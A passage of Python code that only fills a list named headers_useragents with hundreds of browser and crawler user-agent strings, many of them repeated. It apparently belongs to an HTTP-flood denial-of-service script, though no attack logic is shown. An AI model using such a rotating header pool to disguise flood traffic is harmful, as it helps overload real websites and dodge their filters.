	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
